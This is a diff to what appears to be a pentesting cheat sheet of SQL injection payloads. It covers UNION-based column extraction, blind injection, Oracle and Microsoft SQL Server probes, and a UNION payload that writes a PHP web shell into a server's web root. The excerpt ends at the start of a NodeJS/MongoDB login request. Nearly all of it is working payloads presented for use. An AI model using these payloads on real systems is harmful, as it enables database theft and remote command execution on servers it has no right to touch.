@@ -58,8 +58,7 @@ Until error occurs, then:
 1' UNION ALL SELECT {columnname} FROM {tablename};--
 ```
 
-\
-
+\\
 
 ## Blind injection
 
@@ -70,18 +69,31 @@ www.example.com/xxx.php?id=1 or 1=1
 ```
 
 ## RCE with UNION
+
 ```
 123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
 ```
 
 ## Oracle DB
+
 ```
 ' UNION SELECT table_name,null,null FROM all_tables--
 ' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
 ' UNION SELECT [col1],[col2],null FROM [table]--
+' AND (SELECT COUNT(global_name) FROM global_name)=19 AND 'AdhT'='AdhT    # number of rows
+' AND (SELECT LENGTH(global_name) FROM global_name)=8 AND 'AdhT'='AdhT    # word count
+' AND SUBSTRC((SELECT global_name FROM global_name),1,1)=65 AND 'AdhT'='AdhT    # Ascii decode
+```
+
+## Microsoft SQL Server
+
+```
+' OR LEN(CURRENT_USER)='3
+' OR SUBSTRING(CURRENT_USER,1,3)='DBO
 ```
 
 ## NodeJS / MongoDB
+
 ```
 POST /login HTTP/1.1
 Host: 10.10.11.139:5000
